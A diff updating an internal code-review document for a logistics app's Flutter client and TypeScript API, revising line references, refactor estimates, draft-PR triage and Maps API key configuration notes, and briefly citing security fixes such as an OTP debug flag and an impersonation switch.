-`customer_flow.dart` (47 guards) are much better disciplined.
+alone does it at lines 482, 491, 493, 517, 522 and 527. `driver_flow.dart` and
+`customer_flow.dart` are much better disciplined: counted on 2026-09-15 with
+`grep -c 'if (!mounted) return'`, they hold 29 and 20 such guards respectively, against 3 in
+`main.dart`. (An earlier version of this line cited 54 and 47. Those were counts of every
+mention of `mounted`, which is now 57 and 47 — a different quantity, and not the one that
+matters here.)
 
 **Failure scenario:** a user taps back while an OTP request is in flight; `setState` fires on a
 disposed widget and throws.
@@ -960,10 +1079,10 @@ Verified by grepping for the definitions, not the call sites:
 
 | Helper | Definitions | Where |
 |---|---|---|
-| `nowUtcMs` | 6 | `auth.ts:5`, `integrationAuth.ts:5`, `integrationServices.ts:34`, `integrationWebhooks.ts:15`, `razorpayWebhook.ts:4`, `services.ts:45` |
-| `id(prefix)` | 4 | `auth.ts:9`, `integrationWebhooks.ts:19`, `integrationServices.ts:38`, `services.ts:134` |
-| `membershipKey` | 3 | `persistence.ts:108`, `persistenceDb.ts:23`, `services.ts:143` |
-| `normalizeInPhone` | 2 | `auth.ts:65`, `services.ts:147` |
+| `nowUtcMs` | 6 | `auth.ts:6`, `integrationAuth.ts:5`, `integrationServices.ts:34`, `integrationWebhooks.ts:15`, `razorpayWebhook.ts:4`, `services.ts:48` |
+| `id(prefix)` | 4 | `auth.ts:10`, `integrationWebhooks.ts:19`, `integrationServices.ts:38`, `services.ts:137` |
+| `membershipKey` | 3 | `persistence.ts:108`, `persistenceDb.ts:23`, `services.ts:146` |
+| `normalizeInPhone` | 2 | `auth.ts:66`, `services.ts:150` |
 
 `nowUtcMs` and `id` are trivial and duplicating them costs little — three similar lines beat a
 premature abstraction, and these barely qualify as abstractions. **The other two are different,
@@ -998,10 +1117,10 @@ Rather than a mechanical split, take the seams where coupling is genuinely low:
 
 | New file | What moves | Lines |
 |---|---|---|
-| `domain/pricing.ts` | `computeFreightGrossPaise`, `quoteShipmentMarketplace`, `pilotRatesEstimate`, `FreightBreakdown` | ~1005-1188 |
+| `domain/pricing.ts` | `computeFreightGrossPaise`, `quoteShipmentMarketplace`, `pilotRatesEstimate`, `FreightBreakdown` | ~1346-1517 |
 | `domain/payouts.ts` | `runPayoutBatch`, ledger helpers, `pilotListCarrierLedger`, payout-batch listing | ~2150-2277, ~1110-1130 |
-| `domain/identity.ts` | org/user/membership creation, ops-admin grant and revoke, visibility predicates | ~190-612 |
-| `domain/delivery.ts` | `submitDriverPod`, `markPodDelivered`, `releasePaymentAndDeliver`, `failCarrierAndRefund` | ~1345-1410, 1600-1818 |
+| `domain/identity.ts` | org/user/membership creation, ops-admin grant and revoke, visibility predicates | ~193-492, ~772-899 |
+| `domain/delivery.ts` | `submitDriverPod`, `releasePaymentAndDeliver`, `markPodDelivered`, `failCarrierAndRefund` | ~1686-1744, ~1941-1958, ~1992-2011, ~2104-2149 |
 | `services.ts` (remainder) | trips, booking, capacity, tracking | the rest |
 
 `domain/pricing.ts` is the cleanest and safest first move: it is pure, takes no `Store`, and is
@@ -1020,7 +1139,7 @@ Roughly 590 lines of the file are template-literal HTML and browser JavaScript f
 partly because it is JavaScript inside a string inside a route handler.
 
 **Step one, low risk and high payoff:** move the two documents into `apps/api/src/portals/
-adminHtml.ts` and `opsPortalHtml.ts`. This alone drops `httpServer.ts` by a quarter and puts the
+adminHtml.ts` and `opsPortalHtml.ts`. This alone drops `httpServer.ts` by a third and puts the
 XSS fix somewhere a reviewer will look.
 
 **Step two, only if step one proves out:** group routes into `routes/auth.ts`, `routes/pilot.ts`,
@@ -1036,20 +1155,26 @@ commit. Do not split the chain and keep the if-chain semantics.
 `main.dart` (1,151 lines) contains `PilotScaffold`, `HomeScreen`, `RegisterScreen`,
 `LoginScreen`, `MyTripsScreen`, `TripDetailScreen` and `PublishTripScreen` — a complete second
 generation of the driver experience, routed at `/pilot-lab`, `/register`, `/trips` and
-`/publish`, and reachable from neither the driver nor the customer shell (the app starts at
-`/driver` or `/customer`).
+`/publish`. The app starts at `/driver` or `/customer`, and the one way in from a shell is the
+"Developer lab" button on the driver welcome screen (`driver_flow.dart:199`), which calls
+`context.go("/pilot-lab")`.
 
 They duplicate `DriverRegisterScreen`, `DriverPhoneScreen`, `DriverOtpScreen`,
 `DriverShipmentsScreen`, `DriverShipmentDetailScreen` and `DriverPublishTripScreen`.
 
 **This is the highest-value refactor in the document** — it is a deletion, not a restructure. It
-removes roughly 900 lines, eliminates the risk of fixing a bug in the wrong copy, and resolves
-M11 outright. `main.dart` becomes about 150 lines of bootstrap and router.
+removes roughly 1,040 lines, eliminates the risk of fixing a bug in the wrong copy, and resolves
+M11 outright. `main.dart` drops to about 110 lines, and less once the four private helpers at
+lines 18-60 go with them — `_defaultAnchorTripWindow` and `_formatIst` are called only from
+`_PublishTripScreenState`, and `_copyToClipboard` and `_legendStripe` already have no call sites
+at all.
 
 **Check first:** confirm nobody is using `/pilot-lab` for demos, and keep `/login`, which the
 customer flow redirects through.
 
-**What gets harder:** nothing, if the routes are genuinely unused. Verify before deleting.
+**What gets harder:** the "Developer lab" button at `driver_flow.dart:199` has to go in the same
+commit. `go_router` resolves `context.go("/pilot-lab")` from a string, so leaving it in place still
+compiles and fails only at runtime, on the router's error screen.
 
 ### R4. Split the two 2,000-line Flutter screen files by journey
 
@@ -1088,14 +1213,14 @@ Each of these is under an hour and has real payoff.
 | Add `pull_request:` to `release.yml` and require the check (M5) | Four lines; tests currently run only after the merge |
 | Set `ENABLE_LEGACY_DEMO_SURFACE` as the sole demo-surface switch (C5) | One line; closes an unauthenticated user dump on alpha and beta |
 | Filter tombstoned trips from the two marketplace reads (C6) | Two conditions; stops customers booking a deactivated carrier |
-| Pass `MAPS_API_KEY` in `Dockerfile.customer-web` (C7) | Three lines; prevents address entry breaking at cutover |
+| Replace the two silent `if (kMapsApiKey.isEmpty) return;` early-returns with a visible error (C7) | Two call sites; `f96ccf9` closed the compile-time half for the web build by reading the key at runtime, but a missing key still fails silently |
 | `>=` instead of `===` in the FULL check (M2) | One character; prevents stuck trips |
 | Guard `payment.captured` on `REFUNDED` (C3) | One line; prevents money-state corruption |
 | Gate `ALLOW_X_USER_ID` on `NODE_ENV` (H1) | One condition; closes a total-impersonation switch |
 | Stop storing empty payout batches (S2) | Two lines; stops 526k rows a year |
 | Add `engines` and `.nvmrc` (M6) | Two lines; saves the next contributor an hour |
-| `.gitignore` the generated `web/index.html` (M8) | One line; prevents an API key reaching git |
-| Set `CUSTOMER_WEB_BASE_URL` in `render.yaml` (M3) | Three lines; partner tracking links resolve |
+| `.gitignore` the generated `web/index.html` (M8) | One line; prevents an API key reaching git. Update `index.template.html` first — since `f96ccf9` the two files differ: `index.html` carries a `runtime-config.js` script tag the template lacks, and regenerating from the template drops it. `scripts/inject-maps-api-key.sh` (line 29, `cp "$TEMPLATE" "$INDEX"`) already runs on every Render build via `scripts/render-build-customer-web.sh:37`, so an untracked `index.html` would be rebuilt without the runtime Maps key |
+| Set `CUSTOMER_WEB_BASE_URL` in `render.yaml` (M3) | Two lines per API service, six across alpha, beta and production; pins the tracking host per environment instead of relying on the code default, which already points at `navig8r-customer.onrender.com` |
 | Add `.env.example` (M7) | Copy the README table |
 
 ---
@@ -1127,7 +1252,7 @@ A review that only lists problems misleads. These are decisions worth keeping, a
 
 ## The open draft PR backlog
 
-Forty-plus draft PRs are open, the oldest from 10 July, none reviewed. Most of the volume is
+Seventy-one PRs are open, every one of them a draft, the oldest (#2) from 1 May, none reviewed. Most of the volume is
 noise, and it is hiding a handful of real fixes. As of 2026-09-13 the newest are #104 and #106.
 
 **PRs #65 through #80 are sixteen near-duplicate PRs**, titled "Fix critical ERP integration
@@ -1139,11 +1264,14 @@ it found, it found once.
 
 | PRs | Action |
 |---|---|
+| #2–#64 | Thirty-nine drafts opened between 1 May and 8 July, all still open and unreviewed. Their titles repeat the same way #65–#80 do — #59, #60, #61, #63 and #64 are all titled "Fix critical ERP integration state regressions". Not triaged here: their diffs were not read. Sample the newest few before deciding what to close, since at least one (#53, integration API key revocation) has a title distinct from the duplicate run. |
 | #65–#80 | Read the newest one (#80) only. If its fix is sound, take it and close #65–#79 as superseded. Then stop or rate-limit whatever opens these. |
 | #81–#85, #87, #98 | Distinct findings, several confirmed independently below. Review individually. |
 | #86, #89 | Documentation PRs (a PRD, an AGENTS.md). #86 overlaps the rewritten README in this PR — worth reconciling rather than merging both. |
-| #93, #95, #96, #97 | Marketing site and build notes, small and self-contained. Quick to clear. |
+| #97 | The last of the marketing-site and build-notes group still open — #95 and #96 merged on 2026-09-02, #93 was closed unmerged the same day. #97 is driver-pilot APK build documentation, not marketing site: it adds `apps/driver_pilot/build-apk.sh`, which is not on main. Not made moot by `f96ccf9` — that commit moved only the Flutter web key path to `window.__NAVI8R_CONFIG__`, and `maps_config_native.dart` still reads `--dart-define=MAPS_API_KEY`. |
+| #100 | Opened 31 August, after this table was first written, and not added when #101 and #102 were. It reports that `OTP_DEBUG` is honoured regardless of environment. Still true: `apps/api/src/auth.ts:98` and `:116` test `process.env.OTP_DEBUG === "1"` with no `NODE_ENV` guard, so any service running with `OTP_DEBUG=1` returns one fixed code from `otp/start` that signs the caller in as any registered phone. `render.yaml` sets it to `1` on alpha and `0` on beta and production, so this bites wherever the dashboard overrides that. See H3. |
 | #101, #102 | #101 carries real production measurements; #102 is about production data durability and outranks everything else here. Read these two first. |
+| #103 | The documentation branch this pass is written on (`docs/codebase-documentation`), opened 4 September, still a draft, and never triaged here. It overlaps #86, as that row already notes, and sits alongside #89 — reconcile the three documentation PRs together rather than reviewing them separately. |
 | #104, #106 | Opened since the first pass. Both verified correct against the source — see below. |
 
 **#104 is correct but fixes one third of the problem.** It reports that beta ignores
@@ -1236,8 +1364,8 @@ described here.
    still fail and driver sign-in will send two messages per attempt.
 2. **The quick wins table.** An afternoon, and it removes two money-correctness bugs and an
    impersonation switch.
-3. **Triage the draft PR backlog** using the table above. Sixteen are duplicates; five contain
-   fixes for findings confirmed here (#87, #98, #101, #102, #104, #106).
+3. **Triage the draft PR backlog** using the table above. Sixteen are duplicates; seven contain
+   fixes for findings confirmed here (#85, #87, #98, #101, #102, #104, #106).
 4. **H7**, the organization-name IDOR. It is a data-exposure bug between customers, and the fix
    is small.
 5. **C1 and C4** before `PAYOUTS_MODE=RAZORPAYX` or any real capacity pressure.
@@ -1246,5 +1374,6 @@ described here.
 8. **R1 step one and R2 step one** — `domain/pricing.ts` and the portal HTML extraction — then
    reassess whether the rest is worth it.
 
-**Before the customer-web cutover, whenever that happens:** C7. It is not broken today and it will
-be broken the moment the image-backed service replaces the static one.
+**Now, not at cutover:** C7. Its direction reversed with `f96ccf9` — the container path was fixed
+and the static Render build is the one that now has no Maps key, so Dart-side geocoding is off on
+the static site. Restore `runtime-config.js` in the static build, or finish the cutover.
